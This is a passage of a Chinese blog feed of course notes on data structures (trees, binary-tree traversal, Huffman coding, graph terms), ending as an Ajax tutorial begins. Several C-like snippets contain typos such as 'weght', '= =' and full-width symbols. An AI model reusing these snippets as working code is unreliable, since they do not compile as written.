的广义表为空表。</p><blockquote><p>广义表与线性表的区别？</p></blockquote><ol><li>线性表的成分都是结构上不可分的单元素</li><li>广义表的成分可以是单元素，也可以是有结构的表</li><li>线性表是一种特殊的广义表</li><li>广义表不一定是线性表，也不一定是线性结构！</li></ol><blockquote><p>广义表的基本运算</p></blockquote><ol><li>求表头GetHead(L):非空广义表的第一个元素，可以是一个单元素，也可以是一个子表求表尾</li><li>求表尾GetTail(L):非空广义表除去表头元素以外其它元素所构成的表。<strong>表尾一定是一个表</strong></li></ol><blockquote><p>广义表的特点</p></blockquote><ol><li>有次序性 一个直接前驱和一个直接后继</li><li>有长度 ＝表中元素个数</li><li>有深度 ＝表中括号的重数</li><li>可递归 自己可以作为自己的子表</li><li>可共享 可以为其他广义表所共享</li></ol><h2 id="4-6案例分析与实现"><a href="#4-6案例分析与实现" class="headerlink" title="4.6案例分析与实现"></a>4.6案例分析与实现</h2><p>略QWQ</p><h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="5-1树和二叉树的定义"><a href="#5-1树和二叉树的定义" class="headerlink" title="5.1树和二叉树的定义"></a>5.1树和二叉树的定义</h2><h2 id="5-1-1树的定义"><a href="#5-1-1树的定义" class="headerlink" title="5.1.1树的定义"></a>5.1.1树的定义</h2><p>树（Tree）是n（n≥0）个结点的有限集，它或为空树（n &#x3D; 0）；或为非空树，对于非空树 T：</p><pre><code>    有且仅有一个称之为根的结点；    除根结点以外的其余结点可分为m（m＞0） 个互不相交的有限集T1, T2, …, Tm, 其中每一    个集合本身又是一棵树，并且称为根的子树（SubTree）。</code></pre><h2 id="5-1-2基本术语"><a href="#5-1-2基本术语" class="headerlink" title="5.1.2基本术语"></a>5.1.2基本术语</h2><p>根 ——即根结点(没有前驱)</p><p>叶子 ——即终端结点(没有后继)</p><p>森林 ——指m棵不相交的树的集合(例如删除A后的子树个数)</p><p>有序树 ——结点各子树从左至右有序，不能互换（左为第一）</p><p>无序树 ——结点各子树可互换位置。</p><p>双亲 ——即上层的那个结点(直接前驱)</p><p>孩子 ——即下层结点的子树的根(直接后继)</p><p>兄弟 ——同一双亲下的同层结点（孩子之间互称兄弟）</p><p>堂兄弟 ——即双亲位于同一层的结点（但并非同一双亲）</p><p>祖先 ——即从根到该结点所经分支的所有结点</p><p>子孙 ——即该结点下层子树中的任一结点</p><p>结点 ——即树的数据元素</p><p>结点的度 ——结点拥有的子树数</p><p>结点的层次 ——从根到该结点的层数（根结点算第一层）</p><p>终端结点 ——即度为0的结点，即叶子</p><p>分支结点 ——即度不为0的结点（也称为内部结点）</p><p>树的度 ——树内各结点度的最大值</p><p>树的深度(或高度)——树中节点的最大层次数结</p><h2 id="5-1-3二叉树的定义"><a href="#5-1-3二叉树的定义" class="headerlink" title="5.1.3二叉树的定义"></a>5.1.3二叉树的定义</h2><p>二叉树（Binary Tree）是n（n≥0）个结点所构成的集合，它或为空树（n &#x3D; 0）；或为非空树，对于非空树T：</p><ol><li>有且仅有一个称之为根的结点；</li><li>除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别称为T的左子树和右子树，且T1和T2本身又都是二叉树。</li></ol><p>二叉树基本特点： • 结点的度小于等于2 • 有序树（子树有序，不能颠倒）</p><h2 id="5-2案例引入"><a href="#5-2案例引入" class="headerlink" title="5.2案例引入"></a>5.2案例引入</h2><h2 id="5-3树和二叉树的抽象数据类型定义"><a href="#5-3树和二叉树的抽象数据类型定义" class="headerlink" title="5.3树和二叉树的抽象数据类型定义"></a>5.3树和二叉树的抽象数据类型定义</h2><h2 id="5-4二叉树的性质和存储结构"><a href="#5-4二叉树的性质和存储结构" class="headerlink" title="5.4二叉树的性质和存储结构"></a>5.4二叉树的性质和存储结构</h2><h2 id="5-5遍历二叉树和线索二叉树"><a href="#5-5遍历二叉树和线索二叉树" class="headerlink" title="5.5遍历二叉树和线索二叉树"></a>5.5遍历二叉树和线索二叉树</h2><h3 id="5-5-1-遍历规则："><a href="#5-5-1-遍历规则：" class="headerlink" title="5.5.1 遍历规则："></a>5.5.1 遍历规则：</h3><p>限定先左后右，则只有前3种情况，分别称之为先（根） 序遍历、中（根） 序遍历和后（根）序遍历</p><blockquote><p>先序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PreOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">PreOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">PreOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>中序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">InOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">InOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>后序遍历算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PostOrderTraverse</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> OK; <span class="comment">//空二叉树</span></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">PostOrderTraverse(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">PostOrderTraverse(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;T-&gt;data; <span class="comment">//访问根结点</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果去掉输出语句，从递归的角度看，三种算法是完全<br>相同的，或说这三种算法的访问路径是相同的，只是访<br>问结点的时机不同。</li><li>时间效率:O(n)&#x2F;&#x2F;每个结点只访问一次</li><li>空间效率:O(n)&#x2F;&#x2F;栈占用的最大辅助空间（树的深度，最坏情况为n）</li></ul><h3 id="5-5-2二叉树的建立："><a href="#5-5-2二叉树的建立：" class="headerlink" title="5.5.2二叉树的建立："></a>5.5.2二叉树的建立：</h3><blockquote><p>递归算法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> CreateBiTree （BiTree &amp;T）&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;ch; <span class="comment">//接受输入</span></span><br><span class="line"><span class="keyword">if</span> (ch==’#’) T=<span class="literal">NULL</span>; <span class="comment">//递归结束，建空树</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T=new BiTNode; </span><br><span class="line">T-＞data=ch; <span class="comment">//生成根结点</span></span><br><span class="line">CreateBiTree(T-＞lchild); <span class="comment">//递归创建左子树</span></span><br><span class="line">CreateBiTree(T-＞rchild); <span class="comment">//递归创建右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>计算二叉树结点总数</p></blockquote><ul><li>如果是空树，则结点个数为0；</li><li>否则，结点个数为左子树的结点个数+右子树的结点个数再+1。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NodeCount</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果空树，则节点个数为0，</span></span><br><span class="line">递归结束</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> NodeCount(T-&gt;lchild)+NodeCount(T-&gt;rchild)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//否则节点个数为左子树的节点个数+右子树的节点个数</span></span><br><span class="line">+<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>计算二叉树深度</p></blockquote><ul><li>如果是空树，则深度为0；</li><li>否则，递归计算左子树的深度记为m，递归计算右子树的深度记为n，二叉树的深度则为m与n的较大者加1。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Depth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"><span class="comment">//树的深度</span></span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果空树，深度为0</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">int</span> m=Depth(T-&gt;lchild); <span class="comment">//递归计算左子树深度为m</span></span><br><span class="line"><span class="type">int</span> n=Depth(T-&gt;rchild); <span class="comment">//递归计算右子树深度为n</span></span><br><span class="line"><span class="keyword">if</span>(m&gt;n) </span><br><span class="line"><span class="keyword">return</span> (m+<span class="number">1</span>); <span class="comment">//m和n较大者+1</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> (n+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>重要结论:若二叉树中各结点的值均不相同，则：由二叉树的前序序列和中序序列，或由其后序序列和中序序列均能唯一地确定一棵二叉树，但由前序序列和后序序列却不一定能唯一地确定一棵二叉树。</code></pre><h3 id="5-5-3-线索化二叉树："><a href="#5-5-3-线索化二叉树：" class="headerlink" title="5.5.3 线索化二叉树："></a>5.5.3 线索化二叉树：</h3><p>普通二叉树只能找到结点的左右孩子信息，而该结点的直接前驱和直接后继只能在遍历过程中获得<br>若将遍历后对应的有关前驱和后继预存起来，则从第一个结点开始就能很快“顺藤摸瓜”而遍历整个树</p><p>线索二叉树构造的实质是将二叉链表中的空指针改为前驱或后继的线索，线索化的过程即是遍历过程中修改空指针<br>的过程！</p><ul><li>线索二叉树：构造的实质是在二叉树（图形式样）上加上线索信息（一般用虚线来表示）</li><li>线索链表：将二叉链表中的空指针改为前驱或后继的线索，<br>线索化的过程即是遍历过程中修改空指针的过程！</li></ul><h2 id="5-6树和森林"><a href="#5-6树和森林" class="headerlink" title="5.6树和森林"></a>5.6树和森林</h2><p>以一组连续的存储单元存储树的结点，每个结点除了数据域data外，还附设一个parent域用以指示其双亲结点的位置<br>优缺点：<br>求结点的双亲和树的根十分方便， 但求结点的孩子时需要遍历整个结构</p><p><img src="https://www.helloimg.com/image/oR0tQu" alt="树和森林"></p><h2 id="5-7哈夫曼树及其应用"><a href="#5-7哈夫曼树及其应用" class="headerlink" title="5.7哈夫曼树及其应用"></a>5.7哈夫曼树及其应用</h2><h3 id="5-7-1-哈夫曼树的构造："><a href="#5-7-1-哈夫曼树的构造：" class="headerlink" title="5.7.1 哈夫曼树的构造："></a>5.7.1 哈夫曼树的构造：</h3><p>基本思想：使权大的结点靠近根<br>操作要点：对权值的合并、删除与替换，总是合并当前值最小的两个</p><p><strong>哈夫曼树的构造过程</strong>：</p><ul><li>第一步：根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。</li><li>第二步：在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。</li><li>第三步：在森林中删除这两棵树，同时将新得到的二叉树加入森林中。重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。</li></ul><p><strong>哈夫曼树构造算法的实现</strong>：</p><figure class="highlight c"><figcaption><span>结点类型定义</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">int</span> weght; <span class="comment">//结点的权值</span></span><br><span class="line"><span class="type">int</span> parent, lch, rch; <span class="comment">//结点的双亲、左孩子、右孩子</span></span><br><span class="line">的下标</span><br><span class="line">&#125;*HuffmanTree; <span class="comment">//动态分配数组存储哈夫曼树</span></span><br></pre></td></tr></table></figure><p>数组[0…2n-1]的0号单元不使用，从1号单元开始使用，叶子<br>结点集中存储在前面部分l~n 个位置，而后面的n-1 个位置存<br>储其余非叶子结点</p><figure class="highlight c"><figcaption><span>初始化</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreatHuffmanTree</span> <span class="params">(HuffmanTree HT, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n&lt;=<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">m=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">HT=new HTNode[m+<span class="number">1</span>]; <span class="comment">//0号单元未用，HT[m]表示根结点</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=m; ++i)</span><br><span class="line">&#123; <span class="comment">//l~m号单元中的双亲、左孩子，右孩子的下标都初始化为0</span></span><br><span class="line">HT[i].lch=<span class="number">0</span>; HT[i].rch=<span class="number">0</span>; HT[i].parent=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;++i) <span class="comment">//输人前n 个单元中叶子结点的权值</span></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;HT[i].weight;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造 Huffman树</span></span><br><span class="line"><span class="keyword">for</span> (i=n+<span class="number">1</span>; i&lt;=m; ++i) </span><br><span class="line">&#123; Select (HT,i<span class="number">-1</span>, s1, s2);</span><br><span class="line">    <span class="comment">//在HT[k](1≤k≤i-1)中选择两个其双亲域为0,</span></span><br><span class="line">    <span class="comment">// 且权值最小的结点,</span></span><br><span class="line">    <span class="comment">// 并返回它们在HT中的序号s1和s2</span></span><br><span class="line">    HT[s1].parent=i; HT[s2] .parent=i; </span><br><span class="line">    <span class="comment">//表示从F中删除s1,s2</span></span><br><span class="line">    HT[i].lch=s1; HT[i].rch=s2 ; </span><br><span class="line">    <span class="comment">//s1,s2分别作为i的左右孩子</span></span><br><span class="line">    HT[i].weight=HT[s1].weight + HT[s2] .weight;</span><br><span class="line">    <span class="comment">//i 的权值为左右孩子权值之和</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-7-2-哈夫曼编码"><a href="#5-7-2-哈夫曼编码" class="headerlink" title="5.7.2 哈夫曼编码"></a>5.7.2 哈夫曼编码</h3><p><strong>基本思想</strong>：为出现次数较多的字符编以较短的编码。为确保对数据文件进行 <strong>有效的压缩和对压缩文件进行正确的解码</strong>，可以利用哈夫曼树来设计二进制编码。</p><p>哈夫曼树中，约定左分支标记为0，右分支标记为l，则根结点到每个叶子结点路径上的0、l序列即为相应字符的编码。</p><p><strong>前缀编码</strong>：一个编码方案中，任一个编码都不是其他任<br>何编码的前缀（最左子串），则称编码是前缀编码，可<br>以保证对压缩文件进行解码时不产生二义性， 确保正确<br>解码。</p><p>哈夫曼树中，约定左分支标记为0, 右分支标记为l,则根结<br>点到每个叶子结点路径上的0、l序列即为相应字符的编码。</p><p><strong>哈夫曼编码</strong>：对一棵具有n个叶子的哈夫曼树，若对树中<br>的每个左分支赋予0, 右分支赋予1，则从根到每个叶子的<br>路径上，各分支的赋值分别构成一个二进制串， 该二进<br>制串就称为哈夫曼编码</p><figure class="highlight c"><figcaption><span>哈夫曼编码构造算法的实现</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreatHuffmanCode</span><span class="params">(HuffmanTree HT, HuffmanCode &amp;HC, <span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="comment">//从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中</span></span><br><span class="line">HC=new <span class="type">char</span> *[n+<span class="number">1</span>]; <span class="comment">//分配n个字符编码的头指针矢量</span></span><br><span class="line">cd=new <span class="type">char</span> [n]; <span class="comment">//分配临时存放编码的动态数组空间</span></span><br><span class="line">cd[n<span class="number">-1</span>]=’\<span class="number">0</span>’; <span class="comment">//编码结束符</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i)&#123; <span class="comment">//逐个字符求赫夫曼编码</span></span><br><span class="line">start=n<span class="number">-1</span>; c=i; f=HT[i].parent; </span><br><span class="line"><span class="keyword">while</span>(f!=<span class="number">0</span>)&#123; <span class="comment">//从叶子结点开始向上回溯，直到根结点</span></span><br><span class="line">--start; <span class="comment">//回溯一次start向前指一个位置</span></span><br><span class="line"><span class="keyword">if</span> (HT[f].lchild= =c) cd[start]=’<span class="number">0</span>’; <span class="comment">//结点c是f的左孩子，则生成代码0</span></span><br><span class="line"><span class="keyword">else</span> cd[start]=’<span class="number">1</span>’; <span class="comment">//结点c是f的右孩子，则生成代码1</span></span><br><span class="line">c=f; f=HT[f].parent; <span class="comment">//继续向上回溯</span></span><br><span class="line">&#125; <span class="comment">//求出第i个字符的编码</span></span><br><span class="line">HC[i]= new <span class="type">char</span> [n-start]; <span class="comment">// 为第i 个字符编码分配空间</span></span><br><span class="line"><span class="built_in">strcpy</span>(HC[i], &amp;cd[start])； <span class="comment">//将求得的编码从临时空间cd复制到HC的当前行中</span></span><br><span class="line">&#125;</span><br><span class="line">delete cd; <span class="comment">//释放临时空间</span></span><br><span class="line">&#125; <span class="comment">// CreatHuffanCode</span></span><br></pre></td></tr></table></figure><p>哈夫曼编码的几点结论：</p><ul><li>哈夫曼编码是不等长编码。</li><li>哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀。</li><li>哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1。</li><li>发送过程：根据由哈夫曼树得到的编码表送出字符数据</li><li>接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束</li></ul><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="6-1图的定义和基本术语"><a href="#6-1图的定义和基本术语" class="headerlink" title="6.1图的定义和基本术语"></a>6.1图的定义和基本术语</h2><p>图：Graph&#x3D;(V, E)</p><p>V：顶点(数据元素)的有穷非空集合；<br>E：边的有穷集合。</p><ul><li><p>无向图：每条边都是无方向的</p></li><li><p>有向图：每条边都是有方向的</p></li><li><p>完全图：任意两个点都有一条边相连<br><img src="https://www.helloimg.com/images/2023/08/23/oSfOH9.png" alt="完全图"></p></li><li><p>稀疏图：有很少边或弧的图</p></li><li><p>稠密图：有较多边或弧的图</p></li><li><p>网：边&#x2F;弧带权的图</p></li><li><p>邻接：有边&#x2F;弧相连的两个顶点之间的关系。</p></li><li><p>无序：存在边(vi, vj)，则称vi和vj互为邻接点</p></li><li><p>有序：存在弧&lt;vi, vj&gt;，则称vi邻接到vj， vj邻接于vi </p></li><li><p>顶点的度：与该顶点相关联的边的数目，记为TD(v)</p><ul><li>在有向图中, 顶点的度等于该顶点的入度与出度之和。</li><li>顶点 v 的入度是以 v 为终点的有向边的条数, 记作 ID(v)</li><li>顶点 v 的出度是以 v 为始点的有向边的条数, 记作OD(v)</li></ul></li></ul><p><img src="https://www.helloimg.com/images/2023/08/23/oSfvCg.png" alt="问题"></p><ul><li><p>路径：连续的边构成的顶点序列。</p></li><li><p>路径长度：路径上边或弧的数目&#x2F;权值之和。</p></li><li><p>简单路径：除路径起点和终点可以相同外，其余顶点均不相同的路径。（序列中顶点不重复出现的路径）</p></li><li><p>回路(环)：第一个顶点和最后一个顶点相同的路径。</p></li><li><p>简单回路(简单环)：除路径起点和终点相同外，其余顶点均不相同的路<br>径。</p></li><li><p>在无（有）向图G&#x3D;( V, {E} )中，若对任何两个顶点 v、u 都存在从<br>v 到 u 的路径，则称G是连通图（无向）&#x2F;强连通图（有向）。</p></li><li><p>权与网：图中边或弧所具有的相关数称为权。表明从一个顶点到另一个顶点的距离或耗费。带权的图称为网。</p></li><li><p>子图：设有两个图G&#x3D;(V，E)、G1&#x3D;( V1，{E1})，若V1V，E1 CE，则称 G1是G的子图例:(b)(c)是(a)的子图<br><img src="https://www.helloimg.com/images/2023/08/23/oSfw4M.png" alt="问题"></p></li></ul><p>极大连通子图：该子图是 G 连通子图，将G 的任何不在该子图中的顶点加入，子图不再连通。(图G中并不被其他连通子图包含的连通子图)</p><p>性质：1）连通图只有一个极大连通子图，就是它本身；2）非连通图有多个极大连通子图（非连通图的极大连通子图叫做连通分量，每个分量都是一个连通图）</p><p>无向图 G 的极大连通子图称为G的连通分量。</p><p>有向图 G 的极大强连通子图称为G的强连通分量。</p><p>极小连通子图：该子图是G 的连通子图，在该子图中删除任何一条边，子图不再连通。</p><p>生成树：包含无向图G 所有顶点的极小连通子图。<br>性质：</p><pre><code>1）同一个连通图可以有不同的生成树，所以生成树不是唯一的；2）极小连通子图只存在于连通图中；3）如果在生成树上添加一条边，一定会构成一个环</code></pre><h2 id="6-2案例引入"><a href="#6-2案例引入" class="headerlink" title="6.2案例引入"></a>6.2案例引入</h2><p>六度空间理论：<br>你和任何一个陌生人之间所间隔的人不会超过6个，也就是说，最多通过6个中间人你就能够认识任何一个陌生人。</p><h2 id="6-3图的类型定义"><a href="#6-3图的类型定义" class="headerlink" title="6.3图的类型定义"></a>6.3图的类型定义</h2><p>CreateGraph(&amp;G,V,VR)<br>初始条件：V是图的顶点集，VR是图中弧的集合。<br>操作结果：按V和VR的定义构造图G。</p><p>DFSTraverse(G)<br>初始条件：图G存在。<br>操作结果：对图进行深度优先遍历。</p><p>BFSTraverse(G)<br>初始条件：图G存在。<br>操作结果：对图进行广度优先遍历。</p><h2 id="6-4图的存储结构"><a href="#6-4图的存储结构" class="headerlink" title="6.4图的存储结构"></a>6.4图的存储结构</h2><p><img src="https://www.helloimg.com/images/2023/08/23/oShzyC.png" alt="问题"></p><h2 id="6-5图的遍历"><a href="#6-5图的遍历" class="headerlink" title="6.5图的遍历"></a>6.5图的遍历</h2><p><strong>遍历定义</strong>：从已给的连通图一顶点出发，沿着一些边访遍图中所有的顶点，且使每个顶点仅被访问一次，就叫做图的遍历，它是图的基本运算。<br>遍历实质</p><p><strong>遍历实质</strong>：找每个顶点的邻接点的过程</p><p><strong>图的特点</strong>：图中可能存在<em><strong>回路</strong></em>，且图的任一顶点都可能与其它顶点相通，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。</p><h2 id="6-6图的应用"><a href="#6-6图的应用" class="headerlink" title="6.6图的应用"></a>6.6图的应用</h2>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ajax 详解</title>
      <link href="/post/289c4b31.html"/>
      <url>/post/289c4b31.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-准备工作"><a href="#0-准备工作" class="headerlink" title="0.准备工作"></a>0.准备工作</h1><ul><li><a href="https://blog.csdn.net/Oriental_/article/details/104753399">了解前后端交互</a></li></ul><h1 id="1-初步认识Ajax"><a href="#1-初步认识Ajax" class="headerlink" title="1.初步认识Ajax"></a>1.初步认识Ajax</h1><blockquote><p>什么是Ajax</p></blockquote><ul><li><p>ajax 全名 async javascript and XML(异步JavaScript和XML)</p></li><li><p>是前后台交互的能⼒ 也就是我们客户端给服务端发送消息的⼯具，以及接受响应的⼯具</p></li><li><p>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。</p></li><li><p>AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。</p></li><li><p>是⼀个 默认异步执⾏机制的功能,AJAX分为同步（async &#x3D; false）和异步（async &#x3D; true）</p></li></ul><blockquote><p>什么是同步请求？(false)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">同步请求是指当前发出请求后，浏览器什么都不能做，</span><br><span class="line">必须得等到请求完成返回数据之后，才会执行后续的代码，</span><br><span class="line">相当于生活中的排队，必须等待前一个人完成自己的事物，后一个人才能接着办。</span><br><span class="line">也就是说，当JS代码加载到当前AJAX的时候会把页面里所有的代码停止加载，页面处于一个假死状态，</span><br><span class="line">当这个AJAX执行完毕后才会继续运行其他代码页面解除假死状态</span><br></pre></td></tr></table></figure><blockquote><p>什么是异步请求？(默认:true)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">默认异步：异步请求就当发出请求的同时，浏览器可以继续做任何事，</span><br><span class="line">Ajax发送请求并不会影响页面的加载与用户的操作，相当于是在两条线上，各走各的，互不影响。</span><br><span class="line">一般默认值为true，异步。异步请求可以完全不影响用户的体验效果，</span><br><span class="line">无论请求的时间长或者短，用户都在专心的操作页面的其他内容，并不会有等待的感觉。</span><br></pre></td></tr></table></figure><h1 id="2-Ajax的特性"><a href="#2-Ajax的特性" class="headerlink" title="2.Ajax的特性"></a>2.Ajax的特性</h1><ul><li>不需要插件的⽀持，原⽣ js 就可以使⽤</li><li>⽤户体验好（不需要刷新⻚⾯就可以更新 数据）</li><li><strong>减轻服务端和带宽的负担</strong></li><li><em>缺点：搜索引擎的⽀持度不够，因为数据都不在⻚⾯上，搜索引擎搜索不到</em></li></ul><h1 id="3-Ajax的操作流程"><a href="#3-Ajax的操作流程" class="headerlink" title="3.Ajax的操作流程"></a>3.Ajax的操作流程</h1><p><img src="https://img-blog.csdnimg.cn/20200314233401462.png?x-oss-process=image" alt="操作流程"></p><p>具体操作流程：</p><ul><li>首先通过PHP页面将数据库中的数据取出</li><li>取出后转成json格式的字符串，后利用ajax把字符串返还给前台</li><li>再利用json.parse解析通过循环添加到页面上</li><li>那么反之，前端的数据可以利用ajax提交到后台</li><li>但是后台是没有办法直接把这些数据插入到数据库中，所以要先提交到PHP页面上</li><li>最后再由PHP将数据插入到数据库中</li></ul><h1 id="4-Ajax的使用"><a href="#4-Ajax的使用" class="headerlink" title="4.Ajax的使用"></a>4.Ajax的使用</h1><ul><li>在 js 中有内置的构造函数来创建 ajax 对象</li><li>创建 ajax 对象以后，我们就使⽤ ajax 